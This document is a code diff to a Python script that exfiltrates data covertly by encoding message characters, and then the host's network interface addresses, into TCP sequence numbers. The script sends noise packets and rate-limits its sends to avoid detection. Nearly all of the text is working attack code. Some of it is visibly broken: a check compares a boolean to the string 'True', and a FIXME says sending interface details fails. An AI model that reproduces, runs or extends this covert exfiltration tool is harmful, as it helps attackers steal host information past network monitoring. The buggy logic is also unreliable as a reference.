@@ -49,6 +49,8 @@ import os
 import sys
 import random
 import netifaces
+import re
+import time
 
 
 # ================
@@ -92,7 +94,7 @@ def exfil_bounce():
 # Convert message
 # Lots of options here but we're going to convert each letter of the message
 # to its decimal equivalent.. which will be multiplied by the multiplier.
-def convert_message():
+def convert_message(message):
 	print '[*] converting message: %s' % message
 	for char in message:
 		c = ord(char)
@@ -102,6 +104,24 @@ def convert_message():
 		# Add seq to the global seq_array.
 		seq_array.append(seq)
 		print '%s=%d, seq=%d' % (char, c, seq)
+
+
+# I think single quotes are killing things
+def trim_message(message):
+	print '[*] trimming message'
+	trimmed = []
+	# Check for a valid char
+	for char in message:
+		#valid = re.match('^[\w-]+$', char) is not None
+		invalid = re.match('^\'', char) is not None
+		print '[*] invalid: %s is %s' % (char, invalid)
+		# Add valid chars to trimmed
+		if invalid == 'True':
+			print '[*] skipping %s' % char
+		else:
+			trimmed.append(char)
+	return trimmed
+
 
 def add_n0ise(i):
 	print '[*] adding n0ise..'
@@ -114,6 +134,7 @@ def add_n0ise(i):
 	pkt.ttl = 128
 	send(pkt)
 
+
 # Send message using initial sequence numbers. Add noise.
 def exfil_iseq():
 	i = 0
@@ -123,8 +144,11 @@ def exfil_iseq():
 		pkt.window = k
 		pkt.ttl = 64
 		pkt.seq = seq_array[i]
+		# slow our roll
+		time.sleep(0.5)
 		send(pkt)
 		i += 1
+
 
 # This function sends interface details for interfaces of interest, AF_INET
 # family.
@@ -141,8 +165,12 @@ def send_iface():
 			if 'en' in face or 'eth' in face or 'wlp' in face:
 				print '[*] found: %s' % face
 				message = str(netifaces.ifaddresses(face)[2])
-				convert_message()
-				send_packet()
+				# debugging
+				print '[*] New message: %s' % message
+				trimmed = trim_message(message)
+				print '[*] Trimmed message: %s' % trimmed
+				convert_message(trimmed)
+				exfil_iseq()
 		except:
 			# skip, do nothing
 			print "[-] interface does not contain AF_INET family."
@@ -154,7 +182,7 @@ def send_iface():
 
 # Convert our original message. Later we'll update our message and send
 # network interface data.
-convert_message()
+convert_message(message)
 
 # How long is our message. We can use this when adding noise. If we use the
 # ttl then this will be easy to crack. We might be able to create an algorithm
@@ -170,8 +198,13 @@ exfil_iseq()
 
 seq_array = []  # clear before each use
 
-print '[*] sent: %s' % message
+print '[*] Sent: %s' % message
 print '[*] Getting ready to send network interface details'
+print '[*] Resetting message and seq_array'
 
+message = ''
+seq_array = []
+
+# FIXME: sending interface details is not working
 send_iface()
 
